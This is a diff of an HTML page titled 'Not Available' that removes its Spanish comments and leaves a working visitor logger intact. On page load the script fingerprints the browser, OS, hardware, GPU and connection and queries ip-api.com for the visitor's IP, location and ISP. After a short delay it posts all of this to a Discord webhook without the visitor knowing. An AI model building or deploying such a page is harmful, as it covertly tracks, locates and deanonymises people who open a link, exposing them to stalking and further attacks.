@@ -6,17 +6,13 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Not Available</title>
-  <!-- CSS -->
   <link rel="stylesheet" href="src/css/main.min.css">
-  <!-- Fontawesome -->
   <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet"
     type="text/css" />
-  <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap"
     rel="stylesheet">
-  <!-- Leaflet -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
     integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A=="
     crossorigin="" />
@@ -24,7 +20,6 @@
   <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"
     integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA=="
     crossorigin=""></script>
-  <!-- Notyf CSS -->
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
 </head>
 
@@ -32,7 +27,6 @@
   <header class="header"></header>
   <script src="./config.js"></script>
   <script>
-    // Función para detectar el sistema operativo
     function detectOS() {
       const userAgent = navigator.userAgent;
       if (userAgent.includes("Windows NT 10.0")) return "Windows 10/11";
@@ -49,8 +43,6 @@
       if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
       return "Unknown OS";
     }
-
-    // Función para detectar el navegador
     function detectBrowser() {
       const userAgent = navigator.userAgent;
       if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
@@ -61,37 +53,29 @@
       if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";
       return "Unknown Browser";
     }
-
-    // Función para obtener información detallada del hardware y sistema
     function getPCInfo() {
       return {
-        // Información del navegador
         browser: detectBrowser(),
         browserVersion: navigator.appVersion,
         userAgent: navigator.userAgent,
 
-        // Información del sistema operativo
         operatingSystem: detectOS(),
         platform: navigator.platform,
 
-        // Información de hardware
         cpuCores: navigator.hardwareConcurrency || "No disponible",
         deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No disponible",
         maxTouchPoints: navigator.maxTouchPoints || 0,
 
-        // Información de pantalla
         screenResolution: `${screen.width}x${screen.height}`,
         availableResolution: `${screen.availWidth}x${screen.availHeight}`,
         colorDepth: screen.colorDepth + " bits",
         pixelDepth: screen.pixelDepth + " bits",
         screenOrientation: screen.orientation ? screen.orientation.type : "No disponible",
 
-        // Información de idioma y zona horaria
         language: navigator.language,
         languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 
-        // Información de conexión (si está disponible)
         connection: navigator.connection ? {
           effectiveType: navigator.connection.effectiveType,
           downlink: navigator.connection.downlink + " Mbps",
@@ -99,15 +83,12 @@
           saveData: navigator.connection.saveData
         } : "No disponible",
 
-        // Información de cookies y almacenamiento
         cookiesEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack || "No especificado",
 
-        // Información de Java y plugins
         javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
         plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "No disponibles",
 
-        // Información de GPU
         webGL: (function () {
           try {
             const canvas = document.createElement("canvas");
@@ -125,7 +106,6 @@
           }
         })(),
 
-        // Información de batería (si está disponible)
         battery: (function () {
           if ('getBattery' in navigator) {
             return "Batería API disponible";
@@ -133,11 +113,9 @@
           return "Batería API no disponible";
         })(),
 
-        // Información de fecha y hora
         localTime: new Date().toString(),
         timezoneOffset: new Date().getTimezoneOffset(),
 
-        // Información de rendimiento
         devicePixelRatio: window.devicePixelRatio || 1,
         touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
       };
@@ -158,14 +136,12 @@
       var ispp = document.getElementById('ipppp').innerHTML;
       var extra = document.getElementById("razzylog").innerHTML;
 
-      // Obtener información detallada de la PC
       const pcInfo = getPCInfo();
 
       const request = new XMLHttpRequest();
       request.open("POST", wbhk);
       request.setRequestHeader('Content-type', 'application/json');
 
-      // Formatear la información para Discord
       const pcInfoText = `
 **🖥️ INFORMACIÓN DEL SISTEMA:**
 **Sistema Operativo:** ${pcInfo.operatingSystem}
@@ -205,7 +181,6 @@
       request.send(JSON.stringify(params));
     }
 
-    // Obtener información de IP y geolocalización
     get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
       var div = document.createElement("div");
       div.innerHTML = text;
@@ -222,7 +197,6 @@
       secondList.appendChild(div);
     });
 
-    // Ejecutar después de un tiempo
     setTimeout(function () {
       ipLogByRaz();
     }, 1500);
